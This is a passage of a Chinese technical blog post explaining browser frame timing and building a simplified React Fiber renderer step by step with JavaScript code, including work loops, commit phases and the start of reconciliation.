blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>作者：简可</p>
</blockquote>
<p>理解Fiber，就是理解现代React的灵魂。本文本文主要探索2个问题：</p>
<ol>
<li>为什么页面看起来会卡顿？</li>
<li>Fiber是怎么解决卡顿的？</li>
</ol>
<h2 data-id="heading-0">一、为什么页面看起来会卡顿</h2>
<p>卡顿是人主观的感受，是对画面呈现的描述；研究表明：<strong>大多数人感知到不卡顿的频率在50Hz到60Hz之间，综合考量下60fps（帧率）被视为流畅的基准。</strong></p>
<h3 data-id="heading-1"><strong>1.60Fps</strong></h3>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/ba961f36b5ed41898ef0c6ffb459b02b~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="" loading="lazy"/></p>
<ul>
<li><strong>人眼感知</strong>: 人眼可以感知大约50Hz至60Hz的频率，较高的刷新率可以减少闪烁感，使画面更平滑。</li>
<li><strong>帧率与流畅度</strong>: 帧率指的是每秒显示的画面数量（fps）。帧率越高，意味着每秒显示的静态图像越多，组合起来就越能模拟出流畅的运动，给观看者带来更流畅、更逼真的体验。</li>
<li><strong>渲染间隔</strong>: 帧率和渲染间隔是互逆的关系。渲染间隔大于16.6ms（1/60Hz），意味着画面之间的过渡会不够连贯，从而产生卡顿感。</li>
</ul>
<h3 data-id="heading-2">2.浏览器渲染</h3>
<h4 data-id="heading-3"><strong>浏览器渲染的一次循环</strong></h4>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/a2faefb0847242f9a0b0580668f359b4~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="" loading="lazy"/></p>
<h4 data-id="heading-4"><strong>几个浏览器渲染问题</strong></h4>
<ul>
<li><strong>Q</strong>
<ol>
<li>每一轮 Event Loop 都会伴随着渲染吗？</li>
<li>requestAnimationFrame 在哪个阶段执行，在渲染前还是后？在 microTask 的前还是后？</li>
<li>requestIdleCallback 在哪个阶段执行？如何去执行？在渲染前还是后？在 microTask 的前还是后？</li>
<li>resize、scroll 这些事件是何时去派发的？</li>
</ol>
</li>
<li><strong>A</strong>
<ol>
<li>事件循环<strong>不一定</strong>每轮都伴随着重渲染，但是如果有微任务，一定会伴随着<strong>微任务执行</strong>。</li>
<li>requestAnimationFrame在重新渲染屏幕<strong>之前</strong>执行，非常适合用来做动画。</li>
<li>requestIdleCallback在渲染屏幕<strong>之后</strong>执行，并且是否有空执行要看浏览器的调度，如果你一定要它在某个时间内执行，请使用 timeout参数。</li>
<li>resize和scroll事件其实自带节流，它只在 Event Loop 的渲染阶段去派发事件到 EventTarget 上。</li>
</ol>
</li>
</ul>
<h4 data-id="heading-5">为什么浏览器卡顿</h4>
<ul>
<li>浏览器的渲染和js的执行是互斥的；
<ul>
<li>js可以操作dom，如果在渲染的时候操作了dom，不知道以哪个为准；</li>
</ul>
</li>
<li>一般浏览器的刷新率为60hz，即1秒钟刷新60次。1000ms / 60hz = 16.6ms ，大概每过16.6ms浏览器会渲染一帧画面，也就是一次eventLoop需要保证在16.6ms内完成；</li>
<li>在需要连续渲染的时候，如果js的执行超过16.6ms，导致染间隔大于了16.6ms，就会导致卡顿；</li>
</ul>
<h2 data-id="heading-6">二、Fiber是怎么解决卡顿的</h2>
<p>React Fiber的解决方案：<strong>可中断的异步渲染，<strong>它的核心思想是：<strong>将不可中断的同步更新，拆解成可中断的异步工作单元</strong>，也就是</strong>中断和重启。</strong></p>
<p>下面我们一起通过demo来简单实现Fiber，以更好的理解Fiber：</p>
<h3 data-id="heading-7">1.原生react代码</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ReactDOM</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'react-dom'</span>;

<span class="hljs-keyword">const</span> container = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">"#root"</span>);
<span class="hljs-keyword">const</span> element = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createElement</span>(
    <span class="hljs-string">'div'</span>,
    {
        <span class="hljs-attr">title</span>: <span class="hljs-string">'div'</span>,
        <span class="hljs-attr">name</span>: <span class="hljs-string">'div'</span>
    },
    <span class="hljs-string">'div  '</span>,
    <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'h1'</span>, <span class="hljs-literal">null</span>,
        <span class="hljs-string">'h1'</span>,
        <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'p'</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">'p'</span>)
    ),
    <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'h2'</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">'h2'</span>),
)

<span class="hljs-title class_">ReactDOM</span>.<span class="hljs-title function_">render</span>(
    element,
    container
)
</code></pre>
<h4 data-id="heading-8">效果</h4>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/d6b8218d8e9b4ae8ac37a56006021a04~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="" loading="lazy"/></p>
<h3 data-id="heading-9">2.自己实现createElement和render</h3>
<h5 data-id="heading-10">createElement.js</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">/**
 * 目标？
 * 1、创建fiber节点
 */</span>
<span class="hljs-comment">/**
 * 需要接收哪些参数？
 */</span>
<span class="hljs-comment">/**
 * 需要做什么处理？
 * 1、设置type和props，props内的children
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">createElement</span>(<span class="hljs-params">type, props, ...children</span>) {
    <span class="hljs-keyword">return</span> {
        type,
        <span class="hljs-attr">props</span>: {
            ...props,
            <span class="hljs-attr">children</span>: children?.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">child</span> =&gt;</span> {
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">typeof</span> child === <span class="hljs-string">'object'</span> ? child : <span class="hljs-title function_">createTextElement</span>(child)
            })
        }
    }
}

<span class="hljs-comment">// 创建文本类型的fiber节点</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">createTextElement</span>(<span class="hljs-params">text</span>) {
    <span class="hljs-keyword">return</span> {
        <span class="hljs-attr">type</span>: <span class="hljs-string">'TEXT_ELEMENT'</span>,
        <span class="hljs-attr">props</span>: {
            <span class="hljs-attr">nodeValue</span>: text,
            <span class="hljs-attr">children</span>: []
        }
    }
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
    createElement
}
</code></pre>
<h5 data-id="heading-11">render.js</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">/**
 * 目标？
 * 把fiber节点转换为真实dom
 */</span>
<span class="hljs-comment">/**
 * 做哪些事情？
 * 1、创建dom节点
 * 2、把dom节点挂载到真实dom
 * 3、把子节点也做上述处理
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">render</span>(<span class="hljs-params">element, container</span>) {
    <span class="hljs-keyword">const</span> dom = element.<span class="hljs-property">type</span> === <span class="hljs-string">'TEXT_ELEMENT'</span>
        ? <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createTextNode</span>(<span class="hljs-string">''</span>)
        : <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(element.<span class="hljs-property">type</span>)

    <span class="hljs-keyword">const</span> <span class="hljs-title function_">isProperty</span> = key =&gt; key !== <span class="hljs-string">'children'</span>;
    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(element?.<span class="hljs-property">props</span>)
        .<span class="hljs-title function_">filter</span>(isProperty)
        .<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">name</span> =&gt;</span> dom[name] = element?.<span class="hljs-property">props</span>[name])


    element?.<span class="hljs-property">props</span>?.<span class="hljs-property">children</span>?.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">child</span> =&gt;</span> <span class="hljs-title function_">render</span>(child, dom))

    container.<span class="hljs-title function_">appendChild</span>(dom)
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
    render
}
</code></pre>
<h5 data-id="heading-12">执行</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { createElement } <span class="hljs-keyword">from</span> <span class="hljs-string">'./createElement.js'</span>;
<span class="hljs-keyword">import</span> { render } <span class="hljs-keyword">from</span> <span class="hljs-string">'./render.js'</span>;

<span class="hljs-keyword">const</span> container = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">"#root"</span>);

<span class="hljs-keyword">const</span> element = <span class="hljs-title function_">createElement</span>(
    <span class="hljs-string">'div'</span>,
    {
        <span class="hljs-attr">title</span>: <span class="hljs-string">'div'</span>,
        <span class="hljs-attr">name</span>: <span class="hljs-string">'div'</span>
    },
    <span class="hljs-string">'div  '</span>,
    <span class="hljs-title function_">createElement</span>(<span class="hljs-string">'h1'</span>, <span class="hljs-literal">null</span>,
        <span class="hljs-string">'h1'</span>,
        <span class="hljs-title function_">createElement</span>(<span class="hljs-string">'p'</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">'p'</span>)
    ),
    <span class="hljs-title function_">createElement</span>(<span class="hljs-string">'h2'</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">'h2'</span>),
)

<span class="hljs-title function_">render</span>(
    element,
    container
)
</code></pre>
<h5 data-id="heading-13">效果（和原生react一样）</h5>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/583f851b977149828103d2788c946fb6~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="" loading="lazy"/></p>
<h5 data-id="heading-14">这样写有什么问题？</h5>
<ul>
<li>不能中断执行，可能js执行太长，导致卡顿</li>
</ul>
<h3 data-id="heading-15">3.优化</h3>
<ul>
<li>怎么可以中断、重启执行呢？
<ul>
<li>拆分工作单元</li>
</ul>
</li>
<li>怎么控制每次js执行时间，不占用渲染进程时间？
<ul>
<li>在eventLoop的剩余时间执行js，那我们就想到一个API：requestIdleCallback (<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FAPI%2FWindow%2FrequestIdleCallback" target="_blank" title="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/requestIdleCallback" ref="nofollow noopener noreferrer">developer.mozilla.org/zh-CN/docs/…</a>) 该方法插入一个函数，这个函数将在浏览器空闲时期被调用</li>
</ul>
</li>
<li>优化思路图</li>
</ul>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b6ff2feb764c4316b17b6c8a01eabe67~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="画板" loading="lazy"/></p>
<h4 data-id="heading-16">第一版优化后render.js</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 记录下一个工作单元</span>
<span class="hljs-keyword">let</span> nextUnitOfWork = <span class="hljs-literal">null</span>;

<span class="hljs-comment">/**
 * 要做些什么事情？
 * 1、判断是否有工作单元需要执行
 * 2、判断浏览器是否空闲
 * 3、如果有工作单元且浏览器空闲，执行工作单元
 * 4、一个工作单元执行完成后获取下一个工作单元
 */</span>
<span class="hljs-comment">/**
 * 空闲时间执行完后，交给渲染进程，再怎么重启下一工作单元的执行？
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">workLoop</span>(<span class="hljs-params">deadline</span>) {
    <span class="hljs-keyword">let</span> shouldYield = <span class="hljs-literal">false</span>; <span class="hljs-comment">// 表示线程繁忙，应该中断渲染</span>

    <span class="hljs-keyword">while</span> (nextUnitOfWork &amp;&amp; !shouldYield) {
        <span class="hljs-comment">/**
         * 1、执行工作单元
         * 2、返回下一个工作单元
         */</span>
        nextUnitOfWork = <span class="hljs-title function_">performUnitOfWork</span>(nextUnitOfWork);

        <span class="hljs-comment">// 检查是否有空余时间</span>
        shouldYield = deadline.<span class="hljs-title function_">timeRemaining</span>() &lt; <span class="hljs-number">1</span>;
    }

    <span class="hljs-comment">// 重启下一eventLop的工作单元处理流程</span>
    <span class="hljs-title function_">requestIdleCallback</span>(workLoop);
}

<span class="hljs-comment">// 在浏览器空闲时执行</span>
<span class="hljs-title function_">requestIdleCallback</span>(workLoop);

<span class="hljs-comment">/**
 * 怎么样执行执行工作单元？
 * 1、为fiber节点创建dom节点
 * 2、把创建好的dom节点挂载到真实dom
 * 3、为当前的fiber创建他子节点、兄弟节点的fiber
 * 4、建立父子和兄弟关系
 */</span>
<span class="hljs-comment">/**
 * 怎么样获取下一个工作单元并返回？
 * 1、我们fiber是一个树形结构，我们有哪些方式遍历一棵树？
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">performUnitOfWork</span>(<span class="hljs-params">fiber</span>) {
    <span class="hljs-comment">// 新建DOM元素</span>
    <span class="hljs-keyword">if</span> (!fiber.<span class="hljs-property">dom</span>) {
        fiber.<span class="hljs-property">dom</span> = <span class="hljs-title function_">createDOM</span>(fiber);
    }
    <span class="hljs-keyword">if</span> (fiber.<span class="hljs-property">parent</span>) {
        fiber.<span class="hljs-property">parent</span>.<span class="hljs-property">dom</span>.<span class="hljs-title function_">appendChild</span>(fiber.<span class="hljs-property">dom</span>)
    }

    <span class="hljs-keyword">const</span> elements = fiber?.<span class="hljs-property">props</span>?.<span class="hljs-property">children</span>;
    <span class="hljs-keyword">let</span> prevSibling = <span class="hljs-literal">null</span>;
    elements.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">childrenElement, index</span>) =&gt;</span> {
        <span class="hljs-keyword">const</span> newFiber = {
            <span class="hljs-attr">parent</span>: fiber,
            <span class="hljs-attr">props</span>: childrenElement.<span class="hljs-property">props</span>,
            <span class="hljs-attr">type</span>: childrenElement.<span class="hljs-property">type</span>,
            <span class="hljs-attr">dom</span>: <span class="hljs-literal">null</span>,
            <span class="hljs-attr">sibling</span>: <span class="hljs-literal">null</span>
        }

        <span class="hljs-comment">/**
         * 创建好fiber节点后，怎么建立父子和兄弟节点关系？
         */</span>
        <span class="hljs-keyword">if</span> (index === <span class="hljs-number">0</span>) {
            fiber.<span class="hljs-property">child</span> = newFiber
        } <span class="hljs-keyword">else</span> {
            prevSibling.<span class="hljs-property">sibling</span> = newFiber
        }

        prevSibling = newFiber
    })

    <span class="hljs-comment">// 遍历处理</span>
    <span class="hljs-keyword">if</span> (fiber.<span class="hljs-property">child</span>) {
        <span class="hljs-keyword">return</span> fiber.<span class="hljs-property">child</span>
    }
    <span class="hljs-keyword">let</span> nextFiber = fiber;
    <span class="hljs-keyword">while</span> (nextFiber) {
        <span class="hljs-keyword">if</span> (nextFiber.<span class="hljs-property">sibling</span>) {
            <span class="hljs-keyword">return</span>  nextFiber.<span class="hljs-property">sibling</span>
        }
        nextFiber = nextFiber.<span class="hljs-property">parent</span>
    }
}

<span class="hljs-comment">// 创建dom节点</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">createDOM</span>(<span class="hljs-params">element</span>) {
    <span class="hljs-keyword">const</span> dom = element.<span class="hljs-property">type</span> === <span class="hljs-string">'TEXT_ELEMENT'</span>
        ? <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createTextNode</span>(<span class="hljs-string">''</span>)
        : <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(element.<span class="hljs-property">type</span>)

    <span class="hljs-keyword">const</span> <span class="hljs-title function_">isProperty</span> = key =&gt; key !== <span class="hljs-string">'children'</span>;
    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(element?.<span class="hljs-property">props</span>)
        .<span class="hljs-title function_">filter</span>(isProperty)
        .<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">name</span> =&gt;</span> dom[name] = element?.<span class="hljs-property">props</span>[name])

    <span class="hljs-keyword">return</span> dom;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">render</span>(<span class="hljs-params">element, container</span>) {
    <span class="hljs-comment">// 第一个工作单元</span>
    nextUnitOfWork = {
        <span class="hljs-attr">dom</span>: container,
        <span class="hljs-attr">props</span>: {
            <span class="hljs-attr">children</span>: [element]
        }
    }
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
    render
}
</code></pre>
<h5 data-id="heading-17">Fiber树遍历流程图</h5>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c6b3112aacac4cbbb53056af310ee07e~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="画板" loading="lazy"/></p>
<h5 data-id="heading-18">优化后的第一版有什么问题？</h5>
<ul>
<li>每处理一个fiber节点，都实时挂载到了真实的dom上面
<ul>
<li>操作dom太频繁，导致重排重绘；</li>
<li>如果节点很多，页面展示会有一个逐步出现的效果；</li>
</ul>
</li>
</ul>
<h5 data-id="heading-19">怎么优化？</h5>
<ul>
<li>先对所有工作单元，所有fiber节点创建好dom节点，等所有工作单元处理完成后，一次性挂载到真实dom</li>
</ul>
<h4 data-id="heading-20">第二版优化后render.js</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 下一个工作单元</span>
<span class="hljs-keyword">let</span> nextUnitOfWork = <span class="hljs-literal">null</span>;
<span class="hljs-comment">// 正在进行的渲染 work in progress root</span>
<span class="hljs-keyword">let</span> wipRoot = <span class="hljs-literal">null</span>;

<span class="hljs-comment">/**
 * 怎么样执行执行工作单元？
 * 1、为fiber节点创建dom节点
 * 2、把创建好的dom节点挂载到真实dom
 * 3、为当前的fiber创建他子节点、兄弟节点的fiber
 * 4、建立父子和兄弟关系
 */</span>
<span class="hljs-comment">/**
 * 怎么样获取下一个工作单元并返回？
 * 1、我们fiber是一个树形结构，我们有哪些方式遍历一棵树？
 */</span>
<span class="hljs-comment">/**
 * 统一提交渲染，什么时候提交？
 * 1、没有下一个工作单元 且 有正在进行的渲染
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">workLoop</span>(<span class="hljs-params">deadline</span>) {
    <span class="hljs-comment">// shouldYield 表示线程繁忙，应该中断渲染</span>
    <span class="hljs-keyword">let</span> shouldYield = <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">while</span> (nextUnitOfWork &amp;&amp; !shouldYield) {
        <span class="hljs-keyword">debugger</span>
        nextUnitOfWork = <span class="hljs-title function_">performUnitOfWork</span>(nextUnitOfWork);
        <span class="hljs-comment">// 检查是否有空余时间</span>
        shouldYield = deadline.<span class="hljs-title function_">timeRemaining</span>() &lt; <span class="hljs-number">1</span>;
    }

    <span class="hljs-comment">// 统一提交渲染</span>
    <span class="hljs-keyword">if</span> (!nextUnitOfWork &amp;&amp; wipRoot) {
        <span class="hljs-title function_">commitRoot</span>();
    }

    <span class="hljs-comment">// 重启下一eventLop的工作单元处理流程</span>
    <span class="hljs-title function_">requestIdleCallback</span>(workLoop);
}

<span class="hljs-comment">// 在浏览器空闲时执行</span>
<span class="hljs-title function_">requestIdleCallback</span>(workLoop);

<span class="hljs-comment">/**
 * 怎么样执行执行工作单元？
 * 1、为fiber节点创建dom节点
 * 2、把创建好的dom节点挂载到真实dom
 * 3、为当前的fiber创建他子节点、兄弟节点的fiber
 * 4、建立父子和兄弟关系
 */</span>
<span class="hljs-comment">/**
 * 怎么样获取下一个工作单元并返回？
 * 1、我们fiber是一个树形结构，我们有哪些方式遍历一棵树？
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">performUnitOfWork</span>(<span class="hljs-params">fiber</span>) {
    <span class="hljs-comment">// 新建DOM元素</span>
    <span class="hljs-keyword">if</span> (!fiber.<span class="hljs-property">dom</span>) {
        fiber.<span class="hljs-property">dom</span> = <span class="hljs-title function_">createDOM</span>(fiber);
    }

    <span class="hljs-keyword">const</span> elements = fiber?.<span class="hljs-property">props</span>?.<span class="hljs-property">children</span>;
    <span class="hljs-keyword">let</span> prevSibling = <span class="hljs-literal">null</span>;
    elements.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">childrenElement, index</span>) =&gt;</span> {
        <span class="hljs-keyword">const</span> newFiber = {
            <span class="hljs-attr">parent</span>: fiber,
            <span class="hljs-attr">props</span>: childrenElement.<span class="hljs-property">props</span>,
            <span class="hljs-attr">type</span>: childrenElement.<span class="hljs-property">type</span>,
            <span class="hljs-attr">dom</span>: <span class="hljs-literal">null</span>,
            <span class="hljs-attr">sibling</span>: <span class="hljs-literal">null</span>
        }

        <span class="hljs-keyword">if</span> (index === <span class="hljs-number">0</span>) {
            fiber.<span class="hljs-property">child</span> = newFiber
        } <span class="hljs-keyword">else</span> {
            prevSibling.<span class="hljs-property">sibling</span> = newFiber
        }

        prevSibling = newFiber
    })

    <span class="hljs-keyword">if</span> (fiber.<span class="hljs-property">child</span>) {
        <span class="hljs-keyword">return</span> fiber.<span class="hljs-property">child</span>
    }

    <span class="hljs-keyword">let</span> nextFiber = fiber;
    <span class="hljs-keyword">while</span> (nextFiber) {
        <span class="hljs-keyword">if</span> (nextFiber.<span class="hljs-property">sibling</span>) {
            <span class="hljs-keyword">return</span>  nextFiber.<span class="hljs-property">sibling</span>
        }
        nextFiber = nextFiber.<span class="hljs-property">parent</span>
    }
}

<span class="hljs-comment">// 渲染真实dom</span>
<span class="hljs-comment">// 把正在渲染的标记清除</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">commitRoot</span>(<span class="hljs-params"/>) {
    <span class="hljs-title function_">commitWork</span>(wipRoot.<span class="hljs-property">child</span>);
    wipRoot = <span class="hljs-literal">null</span>;
}

<span class="hljs-comment">// 渲染所有的fiber</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">commitWork</span>(<span class="hljs-params">fiber</span>) {
    <span class="hljs-keyword">if</span> (!fiber) {
        <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-keyword">const</span> parentDom = fiber.<span class="hljs-property">parent</span>.<span class="hljs-property">dom</span>;
    parentDom.<span class="hljs-title function_">appendChild</span>(fiber.<span class="hljs-property">dom</span>)

    <span class="hljs-title function_">commitWork</span>(fiber.<span class="hljs-property">child</span>);
    <span class="hljs-title function_">commitWork</span>(fiber.<span class="hljs-property">sibling</span>);
}

<span class="hljs-comment">// 创建dom节点</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">createDOM</span>(<span class="hljs-params">element</span>) {
    <span class="hljs-keyword">const</span> dom = element.<span class="hljs-property">type</span> === <span class="hljs-string">'TEXT_ELEMENT'</span>
        ? <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createTextNode</span>(<span class="hljs-string">''</span>)
        : <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(element.<span class="hljs-property">type</span>)

    <span class="hljs-keyword">const</span> <span class="hljs-title function_">isProperty</span> = key =&gt; key !== <span class="hljs-string">'children'</span>;
    <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(element?.<span class="hljs-property">props</span>)
        .<span class="hljs-title function_">filter</span>(isProperty)
        .<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">name</span> =&gt;</span> dom[name] = element?.<span class="hljs-property">props</span>[name])

    <span class="hljs-keyword">return</span> dom;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">render</span>(<span class="hljs-params">element, container</span>) {
    wipRoot = {
        <span class="hljs-attr">dom</span>: container,
        <span class="hljs-attr">props</span>: {
            <span class="hljs-attr">children</span>: [element]
        }
    }

    nextUnitOfWork = wipRoot
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
    render
}
</code></pre>
<h5 data-id="heading-21">优化后的第二版还有什么问题？</h5>
<ul>
<li>开销很大，重新渲染时，每次都会全局重新渲染</li>
</ul>
<h5 data-id="heading-22">怎么优化？</h5>
<ul>
<li>diff算法</li>
</ul>
<h5 data-id="heading-23">diff方式</h5>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/99bb6718f3c547c5ad2b224c30353c80~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp" alt="画板" loading="lazy"/></p>
<h4 data-id="heading-24">第三版优化后render.js</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 下一个工作单元</span>
<span class="hljs-keyword">let</span> nextUnitOfWork = <span class="hljs-literal">null</span>;
<span class="hljs-comment">// 正在进行的渲染 work in progress root</span>
<span class="hljs-keyword">let</span> wipRoot = <span class="hljs-literal">null</span>;
<span class="hljs-comment">// 上一次渲染</span>
<span class="hljs-keyword">let</span> currentRoot = <span class="hljs-literal">null</span>
<span class="hljs-comment">// 要删除的fiber</span>
<span class="hljs-keyword">let</span> deletion = [];

<span class="hljs-comment">// 任务调度</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">workLoop</span>(<span class="hljs-params">deadline</span>) {
    <span class="hljs-keyword">let</span> shouldYield = <span class="hljs-literal">false</span>; <span class="hljs-comment">// shouldYield 表示线程繁忙，应该中断渲染</span>
    <span class="hljs-keyword">while</span> (nextUnitOfWork &amp;&amp; !shouldYield) {
        nextUnitOfWork = <span class="hljs-title function_">performUnitOfWork</span>(nextUnitOfWork);
        <span class="hljs-comment">// 检查是否有空余时间</span>
        shouldYield = deadline.<span class="hljs-title function_">timeRemaining</span>() &lt; <span class="hljs-number">1</span>;
    }

    <span class="hljs-comment">// 统一提交渲染</span>
    <span class="hljs-keyword">if</span> (!nextUnitOfWork &amp;&amp; wipRoot) {
        <span class="hljs-title function_">commitRoot</span>();
    }

    <span class="hljs-comment">// 重启下一eventLop的工作单元处理流程</span>
    <span class="hljs-title function_">requestIdleCallback</span>(workLoop);
}

<span class="hljs-comment">// 在浏览器空闲时执行</span>
<span class="hljs-title function_">requestIdleCallback</span>(workLoop);


<span class="hljs-comment">// 以前在这创建fiber节点，创建他子节点、兄弟节点的fiber，建立关系</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">performUnitOfWork</span>(<span class="hljs-params">fiber</span>) {
    <span class="hljs-comment">// 新建DOM元素</span>
    <span class="hljs-keyword">if</span> (!fiber.<span class="hljs-property">dom</span>) {
        fiber.<span class="hljs-property">dom</span> = <span class="hljs-title function_">createDOM</span>(fiber);
    }

    <span class="hljs-keyword">const</span> elements = fiber?.<span class="hljs-property">props</span>?.<span class="hljs-property">children</span>;
    <span class="hljs-title function_">reconcileChildren</span>(fiber, elements)

    <span class="hljs-keyword">if</span> (fiber.<span class="hljs-property">child</span>) {
        <span class="hljs-keyword">return</span> fiber.<span class="hljs-property">child</span>
    }

    <span class="hljs-keyword">let</span> nextFiber = fiber;
    <span class="hljs-keyword">while</span> (nextFiber) {
        <span class="hljs-keyword">if</span> (nextFiber.<span class="hljs-property">sibling</span>) {
            <span class="hljs-keyword">return</span>  nextFiber.<span class="hljs-property">sibling</span>
        }
        nextFiber = nextFiber.<span class="hljs-property">parent</span>
    }
}

<span class="hljs-comment">// 渲染真实dom</span>
<span class="hljs-comment">// 把正在渲染的标记清除</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">commitRoot</span>(<span class="hljs-params"/>) {
    <span class="hljs-title function_">commitWork</span>(wipRoot.<span class="hljs-property">child</span>);

    currentRoot = wipRoot;

    wipRoot = <span class="hljs-literal">null</span>;
}

<span class="hljs-comment">// 渲染所有的fiber</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">commitWork</span>(<span class="hljs-params">fiber</span>) {
    <span class="hljs-keyword">if</span> (!fiber) {
        <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-keyword">const</span> parentDom = fiber.<span class="hljs-property">parent</span>.<span class="hljs-property">dom</span>;

